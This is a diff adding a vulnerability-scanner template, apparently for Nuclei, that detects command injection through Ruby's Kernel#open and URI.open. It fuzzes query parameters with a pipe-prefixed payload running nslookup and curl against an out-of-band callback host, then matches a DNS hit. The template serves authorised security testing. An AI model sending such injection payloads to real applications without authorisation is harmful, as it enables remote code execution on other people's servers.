@@ -1,0 +1,38 @@
+id: cmdi-ruby-open-rce
+
+info:
+  name: Ruby Kernel#open/URI.open RCE
+  author: pdteam
+  severity: high
+  description: |
+   Ruby's Kernel#open and URI.open enables not only file access but also process invocation by prefixing a pipe symbol (e.g., open(“| ls”)). So, it may lead to Remote Code Execution by using variable input to the argument of Kernel#open and URI.open.
+  reference:
+    - https://bishopfox.com/blog/ruby-vulnerabilities-exploits
+    - https://codeql.github.com/codeql-query-help/ruby/rb-kernel-open/
+  tags: cmdi,oast,dast,blind,ruby,rce
+
+variables:
+  marker: "{{interactsh-url}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    stop-at-first-match: true
+    payloads:
+      interaction:
+        - "|nslookup {{marker}}|curl {{marker}}"
+
+    fuzzing:
+      - part: query
+        fuzz:
+          - "{{interaction}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+# digest: 490a0046304402206aa8aaaae832c775eb192a6fa98138271fa21bc2ac34b3881f0e06d24fb48f78022040513ba5b73cbfb5fe42c3a312ae9d8e76fb0d6f942ad7bcfe8dfff4f173d00c:922c64590222798bb761d5b6d8e72950
